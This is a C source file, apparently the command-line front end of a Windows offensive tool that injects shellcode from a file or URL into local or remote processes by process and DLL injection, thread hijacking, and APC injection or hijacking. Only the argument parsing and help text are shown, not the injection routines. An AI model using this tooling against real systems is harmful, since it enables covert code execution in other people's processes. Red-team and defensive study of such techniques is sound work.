#include <stdio.h>

#include "Common.h"

int PrintHelp(char* argv0, char* function)
{
	if (strcmp(function, "process") == 0)
		printf("[!] Usage: %s %s <local/remote> [ProcessName] [EnumerationMethod] <file/URL shellcode>\n", argv0, function);
	else if (strcmp(function, "thread") == 0)
		printf("[!] Usage: %s %s <local/remote> [ProcessName] <file/URL shellcode>\n", argv0, function);
	else if (strcmp(function, "apc") == 0)
		printf("[!] Usage: %s %s <local/remote/hijack> [ProcessName] [alertable/suspended [AlertableFunction]] <file/URL shellcode>\n", argv0, function);
	else
	{
		printf("[!] Usage: %s <Function> <arguments>\n", argv0);
		printf("[i] <Function> Can Be : \n");
		printf("\t1.>>> \"process\"\t\t\t\t::: Process Injection\n");
		printf("\t2.>>> \"thread\"\t\t\t\t::: Thread Hijacking\n");
		printf("\t3.>>> \"apc\"\t\t\t\t::: Apc Injection\n");
	}

	if (strcmp(function, "process") == 0)
	{
		printf("\n[i] [EnumerationMethod] Can Be : \n");
		printf("\t1.>>> \"snapshot\"\t\t\t::: Using CreateToolhelp32Snapshot WinAPI\n");
		printf("\t2.>>> \"enumprocesses\"\t\t\t::: Using EnumProcesses WinAPI\n");
		printf("\t3.>>> \"ntquerysysteminformation\"\t::: Using NtQuerySystemInformation NativeAPI\n");
	}
	else if (strcmp(function, "apc") == 0)
	{
		printf("\n[i] [AlertableFunction] Can Be : \n");
		printf("\t1.>>> \"sleepex\"\t\t\t\t::: Using SleepEx WinAPI\n");
		printf("\t2.>>> \"waitforsingleobjectex\"\t\t::: Using WaitForSingleObjectEx WinAPI\n");
		printf("\t3.>>> \"waitformultipleobjectsex\"\t::: Using WaitForMultipleObjectsEx NativeAPI\n");
		printf("\t4.>>> \"msgwaitformultipleobjectsex\"\t::: Using MsgWaitForMultipleObjectsEx NativeAPI\n");
		printf("\t5.>>> \"signalobjectandwait\"\t\t::: Using SignalObjectAndWait NativeAPI\n");
	}

	return 1;
}

int main(int argc, char *argv[])
{
	if (argc < 2)
		return PrintHelp(argv[0], "");
	else if (argc < 3)
		return PrintHelp(argv[0], argv[1]);

	// Injections.exe process <local/remote> [ProcessName] [EnumerationMethod] <file/URL shellcode>
	if (strcmp(argv[1], "process") == 0)
	{
		if (strcmp(argv[2], "local") == 0 && argv[3])
		{
			if (IsDll(argv[3]))
			{
				printf("[i] Performing local DLL injection\n");
				return LocalProcessDllInjection(argv[3]);
			}

			printf("[i] Performing local process injection\n");
			return LocalProcessInjection(argv[3]);
		}

		else if (strcmp(argv[2], "remote") == 0 && argv[3] && argv[4] && argv[5])
		{
			int EnumerationMethod = NULL;

			// Determine the chosen enumeration method
			if (strcmp(argv[4], "snapshot") == 0)
				EnumerationMethod = SNAPSHOT;
			else if (strcmp(argv[4], "enumprocesses") == 0)
				EnumerationMethod = ENUMPROCESSES;
			else if (strcmp(argv[4], "ntquerysysteminformation") == 0)
				EnumerationMethod = NTQUERYSYSTEMINFORMATION;
			else
			{
				printf("[!] Invalid enumeration method supplied\n");
				return PrintHelp(argv[0], argv[1]);
			}

			if (IsDll(argv[5]))
			{
				printf("[i] Performing remote DLL injection to %s with enumeration method %s\n", argv[3], argv[4]);
				return RemoteProcessDllInjection(argv[3], EnumerationMethod, argv[5]);
			}

			printf("[i] Performing remote process injection to %s with enumeration method %s\n", argv[3], argv[4]);
			return RemoteProcessInjection(argv[3], EnumerationMethod, argv[5]);
		}

		else
			return PrintHelp(argv[0], argv[1]);
	}

	// Injections.exe thread <local/remote> [ProcessName] <file/URL shellcode>
	else if (strcmp(argv[1], "thread") == 0)
	{
		if (strcmp(argv[2], "local") == 0 && argv[3])
		{
			printf("[i] Performing local thread hijacking\n");
			return LocalThreadHijacking(argv[3], GetCurrentThreadId());
		}

		else if (strcmp(argv[2], "remote") == 0 && argv[3] && argv[4])
		{
			printf("[i] Performing remote thread hijacking to %s\n", argv[3]);
			return RemoteThreadHijacking(argv[3], argv[4]);
		}

		else
			return PrintHelp(argv[0], argv[1]);
	}

	// Injections.exe apc <local/remote/hijack> [ProcessName] [alertable/suspended [AlertableFunction]] <file/URL shellcode>
	else if (strcmp(argv[1], "apc") == 0)
	{
		DWORD dwAlertableFunction = NULL;
		BOOL bRemote = TRUE ? strcmp(argv[2], "remote") == 0 : FALSE;
		BOOL bHijack = TRUE ? strcmp(argv[2], "hijack") == 0 : FALSE;
		BOOL bAlertable = TRUE ? (!bHijack && strcmp(argv[argc - 3], "alertable") == 0) : FALSE;

		if (bAlertable && argv[argc-2])
		{
			bAlertable = TRUE;
			if (strcmp(argv[argc-2], "sleepex") == 0)
				dwAlertableFunction = SLEEPEX;
			else if (strcmp(argv[argc - 2], "waitforsingleobjectex") == 0)
				dwAlertableFunction = WAITFORSINGLEOBJECTEX;
			else if (strcmp(argv[argc - 2], "waitformultipleobjectsex") == 0)
				dwAlertableFunction = WAITFORMULTIPLEOBJECTSEX;
			else if (strcmp(argv[argc - 2], "msgwaitformultipleobjectsex") == 0)
				dwAlertableFunction = MSGWAITFORMULTIPLEOBJECTSEX;
			else if (strcmp(argv[argc - 2], "signalobjectandwait") == 0)
				dwAlertableFunction = SIGNALOBJECTANDWAIT;
			else
			{
				printf("[!] Invalid alertable function selected!\n");
				return PrintHelp(argv[0], argv[1]);
			}
		}

		if (bRemote)
		{
			if (bAlertable)
			{
				printf("[!] Remote APC injection with CreateRemoteThread is not available as it's useless. Consider APC Hijacking!\n");
				return 1;
			}

			printf("[i] Performing remote APC injection in %s process with suspended thread!\n", argv[3]);
			ApcInjection(FALSE, dwAlertableFunction, argv[3], argv[argc-1]);
		}
		else if (bHijack)
		{
			printf("[i] Performing APC hijacking against %s process!\n", argv[3]);
			ApcHijacking(argv[3], argv[argc - 1]);
		}
		else
		{
			if (bAlertable)
				printf("[i] Performing local APC injection with alertable thread!\n");
			else
				printf("[i] Performing local APC injection with suspended thread!\n");
			ApcInjection(bAlertable, dwAlertableFunction, NULL, argv[argc - 1]);
		}
	}

	else
	{
		printf("[!] \"%s\" is not valid input...\n", argv[1]);
		return PrintHelp(argv[0], NULL);
	}

	return 0;
}